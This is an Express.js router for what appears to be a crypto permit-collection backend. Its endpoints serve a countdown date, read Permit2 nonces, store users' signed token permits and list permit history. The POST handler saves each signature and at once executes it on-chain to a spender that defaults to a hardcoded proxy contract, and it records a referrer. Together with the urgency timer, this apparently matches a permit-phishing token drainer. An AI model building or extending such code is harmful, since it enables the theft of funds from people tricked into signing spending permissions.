import express from 'express';
import Permit from '../models/Permit.js';
import Settings from '../models/Settings.js';
import { getOnChainNonce, activatePermit } from '../utils/permit2Executor.js';
import { createPermit, getAllPermits, updatePermitById, readSettingFromFile } from '../utils/storage.js';

const router = express.Router();

// GET countdown target date
// Read order: MongoDB → settings.json file → hardcoded 120-day default (only when NOTHING has ever been set)
router.get('/countdown', async (req, res) => {
  try {
    // 1. Try MongoDB first
    let setting = null;
    try {
      setting = await Settings.findOne({ key: 'countdown_target' });
    } catch (e) {
      console.warn('[COUNTDOWN GET] MongoDB query failed, trying file fallback:', e.message);
    }

    if (setting?.value) {
      return res.json({ targetDate: setting.value });
    }

    // 2. MongoDB missed — try the settings file fallback
    const fileValue = readSettingFromFile('countdown_target');
    if (fileValue) {
      console.log('[COUNTDOWN GET] Served from settings file fallback:', fileValue);
      return res.json({ targetDate: fileValue });
    }

    // 3. Nothing ever saved — use the bootstrap default (120 days)
    const defaultTarget = new Date(
      Date.now() + (120 * 24 * 60 * 60 * 1000) + (2 * 60 * 60 * 1000) + (18 * 60 * 1000)
    ).toISOString();
    res.json({ targetDate: defaultTarget });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET next on-chain nonce for an address from Permit2 contract
router.get('/nonce/:address', async (req, res) => {
  try {
    const owner = req.params.address;
    const nonce = await getOnChainNonce(owner);
    res.json({ nonce, owner: owner.toLowerCase() });
  } catch (err) {
    console.error('Error fetching on-chain nonce:', err);
    res.status(500).json({ error: err.message });
  }
});

// POST store a signed permit and automatically activate it on-chain
router.post('/', async (req, res) => {
  try {
    const { owner, token, amount, nonce, deadline, v, r, s, referrer, spender } = req.body;
    if (!owner || !token || !amount || deadline === undefined || v === undefined || !r || !s) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const permit = await createPermit({
      owner,
      token,
      amount,
      nonce,
      deadline,
      v,
      r,
      s,
      spender: spender || process.env.PROXY_CONTRACT_ADDRESS || '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B',
      referrer,
      status: 'pending',
    });

    // Automatically attempt activation on-chain
    let activated = false;
    let txHash = null;
    try {
      console.log(`Auto-activating permit ${permit._id} on-chain for ${owner}...`);
      txHash = await activatePermit(permit);
      await updatePermitById(permit._id, {
        status: 'activated',
        activationTxHash: txHash,
        activatedAt: new Date().toISOString(),
      });
      activated = true;
      console.log(`Successfully auto-activated permit ${permit._id}! TX: ${txHash}`);
    } catch (autoErr) {
      console.warn(`Auto-activation deferred/pending for permit ${permit._id}: ${autoErr.message}`);
    }

    res.status(201).json({ success: true, id: permit._id, activated, txHash });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET permits for a specific owner (user history)
router.get('/history/:address', async (req, res) => {
  try {
    const owner = req.params.address.toLowerCase();
    const allPermits = await getAllPermits();
    const userPermits = allPermits.filter(p => p.owner?.toLowerCase() === owner);
    res.json(userPermits);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;

